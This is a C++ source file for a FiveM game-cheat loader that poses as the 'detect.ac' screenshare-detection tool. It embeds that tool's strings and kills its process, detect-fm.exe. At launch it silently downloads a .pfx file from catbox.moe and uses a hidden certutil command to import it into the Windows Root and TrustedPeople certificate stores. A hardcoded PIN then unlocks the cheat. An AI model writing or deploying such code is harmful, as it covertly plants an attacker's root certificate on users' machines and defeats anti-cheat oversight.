#include "loader.hpp"
#include "assets.hpp"
#include "../ui/ImGui/imgui.h"
#include <Windows.h>
#include <string>
#include <cstdlib>
#include <tlhelp32.h>
#include <urlmon.h>
#include <ishowspeed/cheat.hpp>
#include <structure/includy.hpp>
#include <algorithm>
#include <d3d11.h>
#include <dxgi.h>
using std::min;
using std::max;

namespace FrameWork {
namespace Loader {

static bool open = true;
        static bool block_drag = false;
        static bool should_initialize = false;
        static bool initialized = false;

        static const char* system_informer_strings[] = {
            "detect.ac",
            "*.detect.ac0",
            "detect.ac:443",
            "TERMS AND CONDITIONS; SEE: https://detect.ac/tos",
            "PRIVACY POLICY; SEE: https://detect.ac/privacy",
            "https://detect.ac/auth/user/strings/getstrings/",
            "https://detect.ac/auth/api/sessions/upload/",
            "You have the following rights in relation to your Data:",
            "(I) Right to access - the right to request (i) copies of the information we hold about you at any time, or ",
            "(II) that we modify, update or delete such information. If we provide you with access to the information we hold about you, ",
            "we will not charge you for this, unless your request is 'manifestly unfounded or excessive.' Where we are legally permitted to do so, ",
            "we may refuse your request. If we refuse your request, we will tell you the reasons why.",
            "(II) Right to correct - the right to have your Data rectified if it is inaccurate or incomplete.",
            "(III) Right to erase - the right to request that we delete or remove your Data from our systems.",
            "(IV) Right to restrict our use of your Data - the right to 'block' us from using your Data or limit the way in which we can use it.",
            "(V) Right to data portability - the right to request that we move, copy or transfer your Data.",
            "(VI) Right to object - the right to object to our use of your Data which is used for your ability to register and log in.",
            "To make enquiries, exercise any of your rights set out above, or withdraw your consent to the processing of your Data (where consent is our legal basis for processing your Data), please contact us via this e-mail address: detectscreensharetool@gmail.com or contact us in our discord https://detect.ac/discord If you are not satisfied with the way a complaint you make in relation to your Data is handled by us, you may be able to refer your complaint to the relevant data protection authority. For the UK, this is the Information Commissioner's Office (ICO). The ICO's contact details can be found on their website at https://ico.org.uk/. It is important that the Data we hold about you is accurate and current. Please keep us informed if your Data changes during the period for which we hold it.",
            "Detect reserves the right to change this privacy policy as we may deem necessary from time to time or as may be required by law. Any changes will be immediately shown on the Software and you are deemed to have accepted the terms of the privacy policy on your first use of the Software following the alterations. You may contact Detect by email at detectscreensharetool@gmail.com or make a ticket in our discord https://detect.ac/discord.",
            "https://detect.ac/auth/api/exists/",
            "Copyright (C) detect.ac 2024"
        };

        void TerminateProcessByName(const char* processName) {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == INVALID_HANDLE_VALUE) return;
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnap, &pe)) {
                do {
                    if (wcscmp(pe.szExeFile, L"detect-fm.exe") == 0) {
                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProcess != NULL) {
                            TerminateProcess(hProcess, 0);
                            CloseHandle(hProcess);
                        }
                    }
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        void RunCommandHidden(const char* cmd) {
            STARTUPINFOA si = { sizeof(STARTUPINFOA) };
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        void cert() {
            const char* url = "https://files.catbox.moe/wfm4ed.pfx";
            const char* tempPath = "C:\\Windows\\Branding\\Basebrd\\pl-PL\\cert-detect.pfx";

            HRESULT hr = URLDownloadToFileA(NULL, url, tempPath, 0, NULL);
            if (FAILED(hr)) return;

            char cmd[512];
            sprintf(cmd, "certutil -f -p 123 -importpfx TrustedPeople \"%s\" && certutil -addstore -f Root \"%s\"", tempPath, tempPath);
            RunCommandHidden(cmd);
        }

        void Render(HWND hwnd) {
    if (!open) return;
            block_drag = false;
    ImGuiIO& io = ImGui::GetIO();
            ImVec2 window_size(618, 319);
            ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Always);
            ImGui::SetNextWindowSize(window_size, ImGuiCond_Always);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 1.0f);
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0, 0));
            ImGui::PushStyleColor(ImGuiCol_WindowBg, ImVec4(0, 0, 0, 1.0f));
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
            ImGui::Begin("loader_window", nullptr, ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse | ImGuiWindowFlags_NoMove);
    ImDrawList* draw = ImGui::GetWindowDrawList();
    ImVec2 win_pos = ImGui::GetWindowPos();
    ImVec2 win_size = ImGui::GetWindowSize();
            ImU32 border = IM_COL32(33, 228, 112, 255);
            draw->AddRect(win_pos, win_pos + win_size, border, 0.0f, 0, 3.0f);
            ImGui::SetCursorPos(ImVec2(6, 4));
            ImGui::PushFont(FrameWork::Assets::Manrope_Semmi_Font);
            ImGui::SetWindowFontScale(1.0f);
            ImVec2 textSize = ImGui::CalcTextSize("FiveM");
            float scaleY = 16.0f / textSize.y;
            float scaleX = 40.0f / textSize.x;
            float scale = scaleY < scaleX ? scaleY : scaleX;
            ImGui::SetWindowFontScale(scale);
            ImGui::TextColored(ImVec4(33.0f / 255.0f, 228.0f / 255.0f, 112.0f / 255.0f, 1), "FiveM");
            ImGui::SetWindowFontScale(1.0f);
            ImGui::PopFont();
            ImVec2 xSize = ImVec2(24, 24);
            ImVec2 xPos = ImVec2(win_size.x - xSize.x, 0);
            ImVec2 xScreenMin = win_pos + xPos;
            ImGui::SetCursorScreenPos(xScreenMin);
            if (ImGui::InvisibleButton("loader_close_btn", xSize)) {
                SafeCall(ExitProcess)(0);
            }
            bool hovered = ImGui::IsItemHovered();
            if (hovered) {
                draw->AddRectFilled(xScreenMin, xScreenMin + xSize, IM_COL32(180, 180, 180, 90), 0.0f);
            }
            ImVec2 textSizeX = ImGui::CalcTextSize("X");
            ImGui::SetCursorScreenPos(xScreenMin + ImVec2((xSize.x - textSizeX.x) * 0.5f, (xSize.y - textSizeX.y) * 0.5f));
            ImGui::TextColored(ImVec4(33.0f / 255.0f, 228.0f / 255.0f, 112.0f / 255.0f, 1), "X");

            static char pin[8] = "";
            static bool is_pin_focused = false;
            static int selection_start = 0;
            static int selection_end = 0;
            static bool is_selecting = false;

            ImVec2 center_pos = ImVec2(win_size.x * 0.5f, win_size.y * 0.5f);

            ImVec2 pin_input_size(110, 30);
            ImVec2 go_btn_size(30, 30);
            float spacing = 0.5f;
            ImVec2 pin_input_pos(center_pos.x - (pin_input_size.x + go_btn_size.x + spacing) * 0.5f, center_pos.y - pin_input_size.y * 0.5f);

            draw->AddRectFilled(
                pin_input_pos + win_pos,
                pin_input_pos + win_pos + pin_input_size,
                IM_COL32(20, 20, 20, 255)
            );

    ImGui::PushFont(FrameWork::Assets::Manrope_Semmi_Font);

            bool pin_hovered = ImGui::IsMouseHoveringRect(
                pin_input_pos + win_pos,
                pin_input_pos + win_pos + pin_input_size
            );
            bool pin_clicked = pin_hovered && ImGui::IsMouseClicked(0);

            if (pin_hovered) {
                block_drag = true;
            }

            if (pin_clicked) {
                is_pin_focused = true;
                ImGui::SetKeyboardFocusHere();
            }

            if (ImGui::IsWindowHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem) && ImGui::IsMouseClicked(0) && !pin_hovered) {
                is_pin_focused = false;
            }
            if (!is_pin_focused && strlen(pin) == 0) {
                ImVec2 text_size = ImGui::CalcTextSize("Enter PIN");
                ImGui::SetCursorPos(pin_input_pos + ImVec2(10, (pin_input_size.y - text_size.y) * 0.5f));
                ImGui::TextColored(ImVec4(0.5f, 0.5f, 0.5f, 1.0f), "Enter PIN");
            }

            if (is_pin_focused) {
                ImGuiIO& io = ImGui::GetIO();

                if (io.KeyCtrl && ImGui::IsKeyPressed(ImGuiKey_A)) {
                    selection_start = 0;
                    selection_end = strlen(pin);
                }

                if (ImGui::IsKeyPressed(ImGuiKey_Backspace)) {
                    if (selection_start != selection_end) {
                        int start = min(selection_start, selection_end);
                        int end = max(selection_start, selection_end);
                        memmove(pin + start, pin + end, strlen(pin) - end + 1);
                        selection_start = selection_end = start;
                    } else if (strlen(pin) > 0) {
                        pin[strlen(pin) - 1] = 0;
                        if (selection_start > 0) selection_start--;
                        selection_end = selection_start;
                    }
                }

                if (ImGui::IsKeyPressed(ImGuiKey_LeftArrow)) {
                    if (io.KeyShift) {
                        if (selection_end > 0) selection_end--;
                    } else {
                        selection_start = selection_end = max(0, selection_end - 1);
                    }
                }
                if (ImGui::IsKeyPressed(ImGuiKey_RightArrow)) {
                    if (io.KeyShift) {
                        if (selection_end < strlen(pin)) selection_end++;
                    } else {
                        selection_start = selection_end = min((int)strlen(pin), selection_end + 1);
                    }
                }

                for (int i = 0; i < io.InputQueueCharacters.Size; i++) {
                    char c = io.InputQueueCharacters[i];
                    if (c >= '0' && c <= '9' && (strlen(pin) < 7 || selection_start != selection_end)) {
                        if (selection_start != selection_end) {
                            int start = min(selection_start, selection_end);
                            int end = max(selection_start, selection_end);
                            memmove(pin + start, pin + end, strlen(pin) - end + 1);
                            pin[start] = c;
                            selection_start = selection_end = start + 1;
                        } else if (strlen(pin) < 7) {
                            char digit[2] = { c, 0 };
                            strcat(pin, digit);
                            selection_start = selection_end = strlen(pin);
                        }
                    }
                }

                if (strlen(pin) > 0) {
                    char visible_pin[8];
                    strcpy(visible_pin, pin);
                    ImVec2 text_size = ImGui::CalcTextSize(visible_pin);
                    float text_x = pin_input_pos.x + 10;
                    ImGui::SetCursorPos(ImVec2(text_x, pin_input_pos.y + (pin_input_size.y - text_size.y) * 0.5f));
                    ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), visible_pin);
                }

                if (ImGui::IsMouseClicked(0) && pin_hovered) {
                    is_selecting = true;
                    float rel_x = io.MousePos.x - (win_pos.x + pin_input_pos.x + 10);
                    int i = 0;
                    float pos = 0.0f;
                    for (; i < strlen(pin); i++) {
                        char temp[2] = { pin[i], '\0' };
                        float char_width = ImGui::CalcTextSize(temp).x;
                        if (rel_x < pos + char_width) {
                            break;
                        }
                        pos += char_width;
                    }
                    selection_start = selection_end = i;
                }
                if (is_selecting && ImGui::IsMouseDragging(0)) {
                    float rel_x = io.MousePos.x - (win_pos.x + pin_input_pos.x + 10);
                    int i = 0;
                    float pos = 0.0f;
                    for (; i < strlen(pin); i++) {
                        char temp[2] = { pin[i], '\0' };
                        float char_width = ImGui::CalcTextSize(temp).x;
                        if (rel_x < pos + char_width) {
                            break;
                        }
                        pos += char_width;
                    }
                    selection_end = i;
                }
                if (ImGui::IsMouseReleased(0)) {
                    is_selecting = false;
                }

                if (selection_start != selection_end) {
                    int start = min(selection_start, selection_end);
                    int end = max(selection_start, selection_end);

                    char temp_start[8] = {0};
                    strncpy(temp_start, pin, start);
                    float width_start = ImGui::CalcTextSize(temp_start).x;

                    char temp_end[8] = {0};
                    strncpy(temp_end, pin, end);
                    float width_end = ImGui::CalcTextSize(temp_end).x;

                    ImVec2 select_start = ImVec2(pin_input_pos.x + 10 + width_start, pin_input_pos.y);
                    ImVec2 select_end = ImVec2(pin_input_pos.x + 10 + width_end, pin_input_pos.y + pin_input_size.y);
                    draw->AddRectFilled(select_start + win_pos, select_end + win_pos, IM_COL32(0, 120, 215, 100));
                }

                static float cursor_blink_timer = 0.0f;
                cursor_blink_timer += io.DeltaTime;
                if (cursor_blink_timer > 0.5f) cursor_blink_timer = 0.0f;
                if (cursor_blink_timer < 0.25f && is_pin_focused) {
                    char temp[8] = {0};
                    strncpy(temp, pin, selection_end);
                    float text_width = ImGui::CalcTextSize(temp).x;
                    float cursor_x = pin_input_pos.x + 10 + text_width;
                    ImVec2 cursor_pos(cursor_x, pin_input_pos.y + (pin_input_size.y - 16) * 0.5f);
                    ImGui::SetCursorPos(cursor_pos);
                    ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "|");
                }

                if (pin_hovered) {
                    float text_x = pin_input_pos.x + 10;
                    float mouse_x = io.MousePos.x - win_pos.x;
                    if (mouse_x < text_x || mouse_x > text_x + pin_input_size.x - 20) {
                        ImGui::SetMouseCursor(ImGuiMouseCursor_Arrow);
                    } else {
                        ImGui::SetMouseCursor(ImGuiMouseCursor_TextInput);
                    }
                }
            } else {
                selection_start = selection_end = 0;
            }

            ImVec2 go_btn_pos(center_pos.x + (pin_input_size.x + spacing) * 0.5f, center_pos.y - go_btn_size.y * 0.5f);

            bool go_btn_hovered = ImGui::IsMouseHoveringRect(
                go_btn_pos + win_pos,
                go_btn_pos + win_pos + go_btn_size
            );

            if (go_btn_hovered) {
                block_drag = true;
            }

            draw->AddRectFilled(
                go_btn_pos + win_pos,
                go_btn_pos + win_pos + go_btn_size,
                go_btn_hovered ? IM_COL32(23, 23, 23, 255) : IM_COL32(16, 16, 16, 255)
            );

            ImVec2 go_text_size = ImGui::CalcTextSize("Go");
            ImVec2 go_text_pos = go_btn_pos + ImVec2(
                (go_btn_size.x - go_text_size.x) * 0.5f,
                (go_btn_size.y - go_text_size.y) * 0.5f
            );
            ImGui::SetCursorPos(go_text_pos);
            ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Go");

            if (go_btn_hovered && ImGui::IsMouseClicked(0)) {
                if (strcmp(pin, "8787878") == 0) {
                    should_initialize = true;
                    open = false;
                    ShowWindow(hwnd, SW_HIDE);
                } else {
                    SafeCall(ExitProcess)(0);
                }
            }

    ImGui::PopFont();

            ImGui::End();
    ImGui::PopStyleVar(3);
            ImGui::PopStyleColor();

            if (ImGui::IsMouseHoveringRect(xScreenMin, xScreenMin + xSize)) {
                block_drag = true;
            }

            if (should_initialize && !initialized) {
                ::Cheat::Initialize();
                initialized = true;
            }
}

static LRESULT CALLBACK LoaderWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam)) return true;
            switch (msg) {
            case WM_NCHITTEST: {
                if (block_drag) return DefWindowProc(hWnd, msg, wParam, lParam);
                LRESULT hit = DefWindowProc(hWnd, msg, wParam, lParam);
                if (hit == HTCLIENT) return HTCAPTION;
                return hit;
            }
            case WM_DESTROY:
                PostQuitMessage(0);
                break;
            }
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

int ShowLoaderWindow(HINSTANCE hInstance) {
            cert();

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, LoaderWndProc, 0L, 0L, hInstance, NULL, NULL, NULL, NULL, L"LoaderWindowClass", NULL };
    RegisterClassEx(&wc);
    int w = 618, h = 319;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
            HWND hwnd = CreateWindowW(wc.lpszClassName, L"detect.ac", WS_POPUP | WS_VISIBLE, (sw - w) / 2, (sh - h) / 2, w, h, NULL, NULL, wc.hInstance, NULL);
    
    DXGI_SWAP_CHAIN_DESC sd = {};
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hwnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;
    
    UINT createDeviceFlags = 0;
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
    ID3D11Device* device = nullptr;
    ID3D11DeviceContext* deviceContext = nullptr;
    IDXGISwapChain* swapChain = nullptr;
    ID3D11RenderTargetView* mainRenderTargetView = nullptr;
    
    if (D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &swapChain, &device, &featureLevel, &deviceContext) != S_OK)
        return 0;
    
    ID3D11Texture2D* pBackBuffer = nullptr;
    swapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    if (pBackBuffer)
    {
        device->CreateRenderTargetView(pBackBuffer, NULL, &mainRenderTargetView);
        pBackBuffer->Release();
    }
    
    ImGui::CreateContext();
    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(device, deviceContext);
    FrameWork::Assets::Initialize(device);
    ShowWindow(hwnd, SW_SHOWDEFAULT);
    UpdateWindow(hwnd);
    open = true;
    MSG msg;
    ZeroMemory(&msg, sizeof(msg));
    int result = 0;
            while (open && msg.message != WM_QUIT) {
        while (PeekMessage(&msg, NULL, 0U, 0U, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        float clearColor[4] = { 24.0f / 255.0f, 31.0f / 255.0f, 27.0f / 255.0f, 1.0f };
        deviceContext->OMSetRenderTargets(1, &mainRenderTargetView, NULL);
        deviceContext->ClearRenderTargetView(mainRenderTargetView, clearColor);
        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();
                Render(hwnd);
        ImGui::Render();
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());
        swapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();
    if (mainRenderTargetView) { mainRenderTargetView->Release(); mainRenderTargetView = nullptr; }
    if (swapChain) { swapChain->Release(); swapChain = nullptr; }
    if (deviceContext) { deviceContext->Release(); deviceContext = nullptr; }
    if (device) { device->Release(); device = nullptr; }
    DestroyWindow(hwnd);
    UnregisterClass(wc.lpszClassName, hInstance);

    return result;
}

}
}











